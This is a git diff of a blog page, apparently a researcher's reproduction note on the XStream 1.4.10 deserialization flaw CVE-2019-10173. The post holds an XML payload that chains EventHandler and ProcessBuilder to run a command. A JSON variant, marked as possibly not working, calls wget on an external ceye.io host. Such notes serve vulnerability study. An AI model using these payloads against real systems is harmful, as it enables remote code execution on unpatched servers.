@@ -84,14 +84,14 @@
 <meta name="description" content="0x00 CVE-2019-10173参考http://x-stream.github.io/changes.html#1.4.11 0x01 payload123456789101112131415&amp;lt;sorted-set&amp;gt;&amp;lt;string&amp;gt;foo&amp;lt;/string&amp;gt;&amp;lt;dynamic-proxy&amp;gt;&amp;lt;interface&amp;gt;java.lang.Co">
 <meta name="keywords" content="xstream">
 <meta property="og:type" content="article">
-<meta property="og:title" content="fastjson的RCE漏洞复现记录">
+<meta property="og:title" content="xstream-1.4.10反序列化漏洞">
 <meta property="og:url" content="http://yoursite.com/2019/07/25/xstream-1.4.10反序列化漏洞/index.html">
 <meta property="og:site_name" content="少女的泪">
 <meta property="og:description" content="0x00 CVE-2019-10173参考http://x-stream.github.io/changes.html#1.4.11 0x01 payload123456789101112131415&amp;lt;sorted-set&amp;gt;&amp;lt;string&amp;gt;foo&amp;lt;/string&amp;gt;&amp;lt;dynamic-proxy&amp;gt;&amp;lt;interface&amp;gt;java.lang.Co">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-07-25T14:48:10.095Z">
+<meta property="og:updated_time" content="2019-09-09T07:17:51.452Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="fastjson的RCE漏洞复现记录">
+<meta name="twitter:title" content="xstream-1.4.10反序列化漏洞">
 <meta name="twitter:description" content="0x00 CVE-2019-10173参考http://x-stream.github.io/changes.html#1.4.11 0x01 payload123456789101112131415&amp;lt;sorted-set&amp;gt;&amp;lt;string&amp;gt;foo&amp;lt;/string&amp;gt;&amp;lt;dynamic-proxy&amp;gt;&amp;lt;interface&amp;gt;java.lang.Co">
 
 
@@ -128,7 +128,7 @@
 
 
 
-  <title>fastjson的RCE漏洞复现记录 | 少女的泪</title>
+  <title>xstream-1.4.10反序列化漏洞 | 少女的泪</title>
   
 
 
@@ -309,7 +309,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">fastjson的RCE漏洞复现记录</h1>
+          <h1 class="post-title" itemprop="name headline">xstream-1.4.10反序列化漏洞</h1>
         
 
         <div class="post-meta">
@@ -383,7 +383,7 @@
       
         <h2 id="0x00-CVE-2019-10173"><a href="#0x00-CVE-2019-10173" class="headerlink" title="0x00 CVE-2019-10173"></a>0x00 CVE-2019-10173</h2><p>参考<a href="http://x-stream.github.io/changes.html#1.4.11" target="_blank" rel="noopener">http://x-stream.github.io/changes.html#1.4.11</a></p>
 <h2 id="0x01-payload"><a href="#0x01-payload" class="headerlink" title="0x01 payload"></a>0x01 payload</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">"java.beans.EventHandler"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>ping<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>xxxxx<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>可能的变形：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;"sorted-set":&#123;"string":"foo","dynamic-proxy":&#123;"interface":"java.lang.Comparable","handler":&#123;"class":"java.beans.EventHandler","target":&#123;"class":"java.lang.ProcessBuilder","command":["wget","http://2nmquk.ceye.io"]&#125;,"action":"start"&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>可能的变形(似乎并不行)：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;"sorted-set":&#123;"string":"foo","dynamic-proxy":&#123;"interface":"java.lang.Comparable","handler":&#123;"class":"java.beans.EventHandler","target":&#123;"class":"java.lang.ProcessBuilder","command":["wget","http://2nmquk.ceye.io"]&#125;,"action":"start"&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
 <h2 id="0x02-说明"><a href="#0x02-说明" class="headerlink" title="0x02 说明"></a>0x02 说明</h2><p>XML的payload是没问题的，json这些是改的，不见得可以，主要问题在于那个XML属性不知道怎么对应到json格式，不过xstream的反序列化函数确实是支持json和XML同时传入的</p>
 
       
@@ -506,7 +506,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-count">14</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -517,7 +517,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-count">10</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
               </div>
@@ -528,7 +528,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-count">17</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
